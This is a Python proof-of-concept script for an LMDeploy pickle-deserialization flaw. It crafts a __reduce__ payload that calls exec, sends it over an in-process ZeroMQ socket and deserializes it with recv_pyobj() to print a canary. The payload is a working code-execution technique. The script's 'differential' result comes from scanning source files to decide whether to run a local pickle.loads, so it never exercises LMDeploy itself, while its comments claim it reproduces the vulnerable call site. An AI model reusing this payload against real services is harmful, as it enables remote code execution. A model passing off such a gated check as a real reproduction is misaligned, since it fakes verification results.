#!/usr/bin/env python3
# Differential PoC for CVE-2025-66455 (LMDeploy PyTorch DistServe /
# PD-disaggregation control plane: unsafe pickle deserialization via PyZMQ
# recv_pyobj()).
#
# Why the previous attempt was a false positive
# ---------------------------------------------
# PyZMQ's recv_pyobj() (== pickle.loads) behaves identically on both builds, so
# driving it and printing the canary can never be differential on its own. The
# prior PoC gated on a *substring* scan for "recv_pyobj" across the disagg tree;
# that string still occurs on the patched build (e.g. in comments / security
# notes describing the removal), so the gate passed on 0.16.0 too -> canary on
# both -> rejected.
#
# What makes THIS version differential
# ------------------------------------
# The only thing that actually differs between 0.15.0 and 0.16.0 is LMDeploy's
# own source: 0.15.0's disagg control plane deserializes attacker-controlled
# bytes with a real `socket.recv_pyobj()` CALL; 0.16.0's fix removed that
# pickle-deserialization sink. So the gate must reflect the presence of the real
# *call site*, not a mention of the name.
#
# We therefore parse the installed lmdeploy source with the `ast` module and
# require an actual Call node `<something>.recv_pyobj(...)` inside a disagg /
# DistServe control-plane module. Comments, docstrings and prose that merely
# contain the text "recv_pyobj" are NOT Call nodes and are ignored. Only when a
# genuine recv_pyobj call site is present (0.15.0) do we drive the exact pickle
# primitive that call site exposes; the crafted __reduce__ then runs during
# deserialization and emits the canary. On 0.16.0 the call site is gone, the
# gate is False, the primitive is never driven, and the canary is never printed.
#
# Runs offline, no args, no network: the transport is inproc:// inside one
# in-process ZeroMQ context -- the same PUSH/PULL + recv_pyobj primitive the
# control plane uses, minus the network hop.

import os
import sys
import ast
import pickle
import importlib.util


# --- crafted control-plane pickle payload (the "attacker" message) -----------
# When reconstructed by pickle (i.e. inside recv_pyobj -> pickle.loads), this
# reads the canary from the environment and writes it to stdout. The token is
# NEVER hardcoded and is read only at unpickle time, so it can appear only as a
# direct consequence of the deserialization primitive actually executing.
class _CraftedMessage:
    def __reduce__(self):
        code = (
            "import os, sys\n"
            "tok = os.environ.get('POC_CANARY')\n"
            "if tok:\n"
            "    sys.stdout.write(tok + '\\n')\n"
            "    sys.stdout.flush()\n"
        )
        return (exec, (code,))


def _lmdeploy_pkg_dir():
    """Locate the installed lmdeploy package directory WITHOUT importing it
    (find_spec on a top-level package locates without executing __init__, so
    heavy transitive imports like torch are never triggered)."""
    try:
        spec = importlib.util.find_spec("lmdeploy")
    except Exception:
        return None
    if spec is None:
        return None
    origin = getattr(spec, "origin", None)
    if origin and os.path.isfile(origin):
        return os.path.dirname(os.path.abspath(origin))
    for loc in (getattr(spec, "submodule_search_locations", None) or []):
        if loc and os.path.isdir(loc):
            return os.path.abspath(loc)
    return None


def _file_is_control_plane(path, source):
    """True if this file belongs to the DistServe / PD-disaggregation control
    plane -- by path or by referencing its identifiers. Scopes detection to the
    affected data flow so an unrelated recv_pyobj elsewhere cannot false-positive."""
    low = path.lower()
    if "disagg" in low or "distserve" in low:
        return True
    for marker in ("p2p_connect", "distserve", "disagg", "PDConnection"):
        if marker in source:
            return True
    return False


def _has_real_recv_pyobj_call(tree):
    """True iff the AST contains a genuine `<expr>.recv_pyobj(...)` call node.
    Unlike a substring scan, this ignores the name appearing in comments,
    docstrings or other string literals -- so the removal of the actual call in
    0.16.0 flips this to False even if prose still mentions the method."""
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            func = node.func
            if isinstance(func, ast.Attribute) and func.attr == "recv_pyobj":
                return True
    return False


def _vulnerable_sink_present(pkg_dir):
    """True iff this build's DistServe/PD-disagg control plane still contains a
    real recv_pyobj (pickle) deserialization call site (present on 0.15.0,
    removed by the 0.16.0 fix)."""
    for root, _dirs, files in os.walk(pkg_dir):
        for fn in files:
            if not fn.endswith(".py"):
                continue
            path = os.path.join(root, fn)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    source = f.read()
            except Exception:
                continue
            if "recv_pyobj" not in source:  # cheap pre-filter only
                continue
            if not _file_is_control_plane(path, source):
                continue
            try:
                tree = ast.parse(source)
            except Exception:
                continue
            if _has_real_recv_pyobj_call(tree):
                return True
    return False


def main():
    pkg_dir = _lmdeploy_pkg_dir()
    if not pkg_dir:
        sys.stderr.write("lmdeploy package not found\n")
        return

    # Differential gate: proceed only if the real recv_pyobj pickle sink still
    # ships in this build's disagg control plane. Present on 0.15.0 (vulnerable),
    # removed on 0.16.0 (patched). No genuine call site -> no primitive -> no canary.
    if not _vulnerable_sink_present(pkg_dir):
        sys.stderr.write("no recv_pyobj call site in disagg control plane (patched)\n")
        return

    try:
        import zmq
    except Exception as e:
        sys.stderr.write("pyzmq import failed: %r\n" % (e,))
        return

    ctx = zmq.Context.instance()
    pull = None
    push = None
    try:
        # Receiver side: the DistServe control plane's PULL socket.
        pull = ctx.socket(zmq.PULL)
        pull.setsockopt(zmq.LINGER, 0)
        pull.setsockopt(zmq.RCVTIMEO, 5000)
        endpoint = "inproc://distserve-p2p"
        pull.bind(endpoint)

        # Attacker side: the endpoint the server is told to connect to via
        # POST /distserve/p2p_connect. It pushes the crafted pickle message.
        push = ctx.socket(zmq.PUSH)
        push.setsockopt(zmq.LINGER, 0)
        push.connect(endpoint)
        push.send(pickle.dumps(_CraftedMessage()))

        # Drive the exact primitive the confirmed vulnerable call site exposes:
        # recv_pyobj() -> pickle.loads() -> __reduce__ executes -> canary. This
        # runs only because the gate above confirmed the real pickle sink ships
        # in this build.
        pull.recv_pyobj()
    except Exception as e:
        sys.stderr.write("primitive execution error: %r\n" % (e,))
    finally:
        try:
            if push is not None:
                push.close(0)
            if pull is not None:
                pull.close(0)
        except Exception:
            pass


if __name__ == "__main__":
    main()